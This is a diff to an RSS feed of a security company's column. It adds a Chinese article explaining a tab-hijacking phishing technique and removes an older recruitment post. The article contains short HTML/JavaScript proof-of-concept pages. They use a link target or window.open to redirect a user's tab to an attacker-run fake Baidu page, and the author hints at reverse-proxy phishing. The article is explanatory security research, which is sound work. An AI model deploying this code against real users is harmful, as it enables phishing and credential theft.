@@ -5,7 +5,57 @@
 <link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
 <description></description>
 <language>zh-cn</language>
-<lastBuildDate>Fri, 09 Mar 2018 14:42:25 +0800</lastBuildDate>
+<lastBuildDate>Wed, 14 Mar 2018 02:48:25 +0800</lastBuildDate>
+<item>
+<title>前端黑魔法之远程控制地址栏</title>
+<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-13-34495488.html</link>
+<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34495488&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-33395718b82a3db6e77cea8f881e7528_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt;&lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;由于今天看到一篇文章《&lt;a href=&quot;https://paper.seebug.org/538/&quot;&gt;危险的 target=&quot;_blank&quot; 与 “opener”&lt;/a&gt;》，里面提到了一个老知识点，就是target=&quot;_blank&quot;的时候，新打开的页面可以通过window.opener来控制源页面的URL，进行钓鱼攻击。这个攻击手法我在博客《&lt;a href=&quot;https://www.leavesongs.com/HTML/opener-fishing.html&quot;&gt;神奇的opener对象&lt;/a&gt;》中也说过，这里就不再赘述了。这篇文章抛出另一种与target有关的钓鱼攻击。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x01&quot;&gt;0x01 效果演示&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先可以看一个小例子：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://675ba661.2m1.pw/41593a&quot;&gt;http://675ba661.2m1.pw/41593a&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-90a98df05aa9c08b04f362421c4d3651_r.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1154&quot; data-rawheight=&quot;764&quot; data-thumbnail=&quot;https://pic3.zhimg.com/v2-90a98df05aa9c08b04f362421c4d3651_b.jpg&quot;&gt;&lt;p&gt;打开上述链接，然后点击“click me”，打开了百度。这时查看地址栏，的的确确是百度，然后我们等待10秒，再次查看地址栏，这个时候已经变成攻击者的网址了；即使此时我们再访问淘宝等页面，只要仍然在这个标签页下，地址栏就仍然会被控制。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x02&quot;&gt;0x02 原理说明&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;上述页面的代码也很简单：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot; onclick=&quot;return start()&quot;&amp;gt;click me&amp;lt;/a&amp;gt;
+
+&amp;lt;script&amp;gt;
+function start() {
+    setInterval(function() {
+        baidu.href=&quot;http://675ba661.2m1.pw/baidu&quot;;
+        baidu.click();
+    }, 10000);
+}
+&amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;如果用户点击了超链接“click me”，这里会启动一个循环定时器，每过10秒钟，将会将超链接的地址更换成一个仿百度的钓鱼网站，并再次点击。（当然，如果是真实攻击的话，最好是做一个真实目标的反代服务器，这个在我另一篇文章《&lt;a href=&quot;https://www.leavesongs.com/SOFT/play-with-openresty-lua-web.html&quot;&gt;openresty+lua在反向代理服务中的玩法&lt;/a&gt;》中也有详细的介绍）。&lt;/p&gt;&lt;p&gt;这里，超链接的target属性指定目标URL在哪个页面下打开，就是目标页面的window.name。如果这个a标签的href发生了变化，再次点击链接，页面仍然会在相同的标签页下打开，所以就覆盖了上一次打开的页面。&lt;/p&gt;&lt;p&gt;比如，我们是一个“网址导航”类型的恶意网站，用户在我们网站上打开了百度、淘宝等标签页面，我们将可以根据用户打开的超链接来生成钓鱼页面，伪造这些网站的登录页面，精准地进行钓鱼。我这里就不进行演示了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x03&quot;&gt;0x03 扩展尝试&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;除了超链接以外，用window.open也可以达到一样的效果：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;a href=&quot;javascript:;&quot; onclick=&quot;return start()&quot;&amp;gt;click me&amp;lt;/a&amp;gt;
+
+&amp;lt;script&amp;gt;
+function start() {
+    var w = window.open(&#39;https://www.baidu.com&#39;, &#39;baidu&#39;);
+    setInterval(function() {
+        w.location = &#39;http://675ba661.2m1.pw/baidu&#39;
+    }, 5000)
+}
+&amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;不过，window.open经常会被广告拦截相关的功能给阻止掉，所以可能效果不如直接用超链接。&lt;/p&gt;&lt;p&gt;那么，继续深入研究。这个现象究竟是否和window.name有关呢？那么是不是我们知道了某个页面的name，即可对其页面的URL进行控制？&lt;/p&gt;&lt;p&gt;我们可以做一个实验。编写A页面（ &lt;a href=&quot;http://a.675ba661.2m1.pw/A_victim&quot;&gt;http://a.675ba661.2m1.pw/A_victim&lt;/a&gt; ）：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;p&amp;gt;Hello world.&amp;lt;/p&amp;gt;
+&amp;lt;script&amp;gt;
+window.name = &#39;baidu&#39;;
+&amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;编写B页面（ &lt;a href=&quot;http://b.675ba661.2m1.pw/B_attacker&quot;&gt;http://b.675ba661.2m1.pw/B_attacker&lt;/a&gt; ）：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot;&amp;gt;click me&amp;lt;/a&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;A页面是目标网站，其中设置自己的name是baidu；B是攻击者的页面，其中设置&lt;code class=&quot;inline&quot;&gt;target=&quot;baidu&quot;&lt;/code&gt; &lt;/p&gt;&lt;p&gt;显然，我们在B中点击“click me”以后，会打开一个新的页面，而不是修改A页面的URL。这个实验说明，URL的远程控制和window.name没有直接关系，而是和页面的父子关系有关。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x04&quot;&gt;0x04 总结&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本文所描述的攻击方式和opener的攻击方式比较相似，都是在不能跨域的情况下，控制目标标签页的URL，进而进行钓鱼攻击。&lt;/p&gt;&lt;p&gt;但我觉得这个攻击持久型更佳，因为即使用户在新标签中输入自己的域名，或者又通过超链接点击到其他网站里，这个页面的地址栏永远是受到源页面的控制的。理论上在源页面不关闭的情况下，可以永久控制新页面的地址栏。&lt;/p&gt;</description>
+<author>小蘑菇</author>
+<guid isPermaLink="false">2018-03-13-34495488</guid>
+<pubDate>Tue, 13 Mar 2018 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>从SQL注入到Getshell：记一次禅道系统的渗透</title>
 <link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-07-34275981.html</link>
@@ -689,15 +739,6 @@ sys	0m0.000s &lt;/code&gt;&lt;p&gt;仅需 0.8s 即可解出结果。&lt;/p&gt;&l
 <author>朱文雷</author>
 <guid isPermaLink="false">2017-10-29-30548907</guid>
 <pubDate>Sun, 29 Oct 2017 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>好胆你就来！长亭科技CROSS计划：跨专业招聘计算机人才</title>
-<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-27-30515472.html</link>
-<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30515472&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-550fa0c48fdc0b4ab5d1281c4cc098fd_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;我大学的时候学了一份&lt;b&gt;特别牛逼、高大上&lt;/b&gt;的专业——生物科学。&lt;br&gt;至于为啥我学了这个专业，不知道是哪个神人在我报志愿之前，天天吹捧&lt;b&gt;21世纪是生物学的天下&lt;/b&gt;！&lt;br&gt;当时研究了三个专业：生物工程、生物技术、生物科学，&lt;b&gt;只有这个生物科学听起来是最为牛逼&lt;/b&gt;的。&lt;br&gt;现在看起来依然牛逼，毕业之后工作也确实难找。&lt;br&gt;其实除了班里一半深造的，其他的人只有一个从事了生物行业。&lt;br&gt;最为蛋疼的是，好几个准备考公务员却止步于专业限制，我们这个专业考公务员都受限！&lt;br&gt;那位说21世纪是生物学的神人同志，现在我要来跟你聊一下人生聊一下理想。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;我是正在找工作的应届师范生。&lt;br&gt;当初选了服从调剂专业，教育技术，开始一年都不知道干嘛的，大概就是中学信息技术老师。&lt;br&gt;当时觉得当个副科老师不错啊！&lt;br&gt;真正找工作了才发现，市场需求太少！！&lt;br&gt;&lt;b&gt;没几个学校缺信息技术老师的！！！&lt;/b&gt;&lt;br&gt;语文数学的一招就是几十个，信息技术一两个或者压根不要，不当老师又不知道还能干嘛？&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;本科生物，学霸，&lt;b&gt;成绩top 1％&lt;/b&gt;，&lt;br&gt;然后，大四没有找到工作……&lt;br&gt;怒而考研，&lt;b&gt;跨专业，挑战CS&lt;/b&gt;（计算机）&lt;br&gt;真是比高三还辛苦，高三时无知者无畏，没什么压力。&lt;br&gt;虽然之前一直努力，但稳稳妥妥生物与CS，风马牛不相及啊。&lt;br&gt;&lt;b&gt;考研努力流过的汗都是当年选专业时脑子进的水啊~&lt;/b&gt;&lt;br&gt;都说转行毁三年，诚然，我三年的生物学积累毁于一旦。&lt;br&gt;然，不转，毁我一生！&lt;br&gt;不过，“21世纪是生物的世纪”，现在毕竟只是世纪之初，以后的事谁又能预料。&lt;br&gt;不过，不会后悔。我爱CS，JUST DO IT!&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;这些案例，是不是看着有些眼熟？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;说的就是你对不对？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;（备注：以上并不是吐槽任何专业不好，而是部分专业确实存在就业难的问题，请勿吐槽）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;影影绰绰中，我们提出一个大胆的想法！&lt;/p&gt;&lt;p&gt;&lt;b&gt;不！限！专！业！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;醉心CS，爱钻研，懂技术，享受成就的你们！&lt;/p&gt;&lt;p&gt;&lt;b&gt;有胆量，来长亭试试吧！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;不是怂恿放弃其他专业，而是当你心中有这个声音时，多给你一个选择！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;CROSS计划&lt;/b&gt;，是长亭科技为发掘在计算机领域中拥有独到见解与研究的&lt;b&gt;非计算机专业人才&lt;/b&gt;而决定每年保留的校招计划！接头口号： &lt;b&gt;好胆你就来！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;不管你学什么专业，建筑、土木、数学甚至是与计算机毫不相关的文科生，只要你对计算机领域拥有浓厚的兴趣，且在业余时间：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;花了足够的精力去钻研，&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;有扎实的数理基础，&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;有独立的思考和研究态度&lt;/b&gt;，&lt;/p&gt;&lt;p&gt;&lt;b&gt;我们统统欢迎！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;其实，我们也&lt;b&gt;怕&lt;/b&gt;！&lt;/p&gt;&lt;p&gt;&lt;b&gt;怕&lt;/b&gt;这个活动没有那么多人响应，&lt;/p&gt;&lt;p&gt;&lt;b&gt;怕&lt;/b&gt;你们害怕自己技术不行，&lt;/p&gt;&lt;p&gt;&lt;b&gt;怕&lt;/b&gt;有人觉得长亭这个提议太理想国了！&lt;/p&gt;&lt;p&gt;While，我们选择站了出来，毕竟，&lt;/p&gt;&lt;p&gt;&lt;b&gt;放胆迈出第一步，才有可能将理想变成现实！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;所以，邀请您，你，恁，&lt;b&gt;好胆你就来&lt;/b&gt;！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;不是计算机专业≠不是计算机人才&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;当你心中有这个声音时，多给你一个选择。&lt;/p&gt;&lt;p&gt;大胆地迈出这一步，做自己真正想做的事情。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在这里，你可以跟随技术大牛光速起步，迅速打下扎实的计算机功底。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在这里，你可以参与各种规范的工程项目，快速积累丰富的工程经验。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在这里，你还可以接触最新最酷的黑客技术，见证各种魔术般颠覆想象的神奇。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;而以上通通不是吹牛，因为我们有足够多的转行成功案例，他们来自于不同的专业：数学、水利、航空航天、航海、机械等等等等，哦差点忘了，还。。。还有秘书专业。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;应届毕业生通过CROSS计划：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;1. 进入长亭科技产品研发部门实习&lt;/p&gt;&lt;p&gt;2. 获得长亭技术大佬&lt;b&gt;1对1指导&lt;/b&gt;的珍贵机会（CTO亲自参与）&lt;/p&gt;&lt;p&gt;3. 更有毕业后直接转正的机会！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;友情提示：&lt;/p&gt;&lt;p&gt;长亭是一个对技术期望颇高的团队，&lt;/p&gt;&lt;p&gt;然而我们更看重的，&lt;/p&gt;&lt;p&gt;是你思考问题的思路，&lt;/p&gt;&lt;p&gt;看待世界的角度！&lt;/p&gt;&lt;p&gt;如果刚好你也这样，那就来吧！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;计算机专业的同学也不要自卑，&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;简历也不会被扔出去！&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;除了研发岗位，&lt;b&gt;市场、销售、技术支持&lt;/b&gt;等岗位也在期待你的加入！具体岗位信息请戳长亭科技官网（&lt;a href=&quot;https://chaitin.cn/cn/join-us.html&quot;&gt;https://chaitin.cn/cn/join-us.html&lt;/a&gt;）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;简历投递传送门：hr@chaitin.com&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;邮件主题请注明 “CROSS计划”！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;来！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
-<author>朱文雷</author>
-<guid isPermaLink="false">2017-10-27-30515472</guid>
-<pubDate>Fri, 27 Oct 2017 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
